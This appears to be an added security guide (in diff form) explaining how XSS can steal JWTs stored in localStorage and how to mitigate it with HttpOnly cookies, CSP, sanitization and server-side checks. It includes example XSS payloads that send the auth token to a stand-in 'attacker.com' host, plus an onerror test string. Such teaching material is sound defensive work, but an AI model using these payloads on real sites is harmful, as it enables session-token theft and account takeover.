@@ -1,0 +1,88 @@
+XSS (Cross-Site Scripting) Mitigation
+
+- XSS (Cross-Site Scripting) is a client-side attack 
+- where malicious scripts are injected into web pages viewed by other users. 
+- If a JWT is stored insecurely (like in localStorage), 
+- an XSS vulnerability can allow attackers to steal that token.
+
+⚠️ Why XSS is Dangerous in JWT-based Authentication
+- If JWT is stored in localStorage/sessionStorage, 
+  it is accessible via JavaScript.
+
+- A malicious script (via XSS) can read the token and 
+  send it to an attacker, giving them access to your user session.
+
+
+
+
+🔐 JWT + XSS: Common Vulnerable Setup
+    // Storing JWT in localStorage after login
+    localStorage.setItem("authToken", jwtToken);
+    
+    // Using it for every request
+    fetch('/profile', {
+      headers: {
+        Authorization: 'Bearer ' + localStorage.getItem("authToken")
+      }
+    });
+
+If your site is vulnerable to XSS:
+<script>
+  fetch('https://attacker.com?token=' + localStorage.getItem("authToken"));
+</script>
+The attacker now has your token. 😨
+
+
+Best Practices to Mitigate XSS in JWT Usage
+1. Do Not Store JWT in localStorage or sessionStorage
+    Use HTTP-only, Secure cookies instead. 
+    These cannot be accessed via JavaScript, 
+    so even if XSS exists, the attacker can’t steal them.
+✅ Safer Alternative:
+Set-Cookie: token=JWT_TOKEN; HttpOnly; Secure; SameSite=Strict
+
+2. Use Content Security Policy (CSP)
+      CSP can block inline scripts and restrict loading malicious 
+      scripts from external domains.
+      <meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; script-src 'self'">
+
+
+3. Sanitize All User Inputs and Outputs
+    Use libraries like:
+    DOMPurify (JavaScript)
+    html/template in Go
+    Django’s autoescape in templates
+    This prevents injecting JavaScript into your HTML pages.
+
+4. Use SameSite Cookies
+    SameSite cookies prevent cross-origin 
+    requests from including cookies. 
+    This helps mitigate CSRF and adds a layer of protection.
+Set-Cookie: token=JWT_TOKEN; HttpOnly; Secure; SameSite=Strict
+
+5. Validate JWT on Every Request (Server-Side)
+    Even if a JWT is stolen, you can:
+    Check for blacklisted tokens.
+    Check IP, user-agent, or geo-location.
+    Implement device fingerprinting.
+
+
+🧪 Real-Time Example
+🏦 Use Case: Online Banking Portal
+🔐 Safe Flow:
+      User logs in → Server sets an HttpOnly cookie with JWT
+      All subsequent requests automatically include the cookie
+      No JS can access the JWT, even if there’s an XSS hole in your app
+      Server validates JWT and gives access only if valid
+
+🛑 Unsafe Flow (XSS-prone):
+JWT is stored in localStorage
+An attacker finds XSS in your comment box 
+                        (<img src=x onerror=alert(document.cookie)>)
+Injects:
+<script>
+fetch('https://attacker.com?token=' + localStorage.getItem('authToken'));
+</script>
+Attacker gets your token, impersonates you, and accesses your account.
+
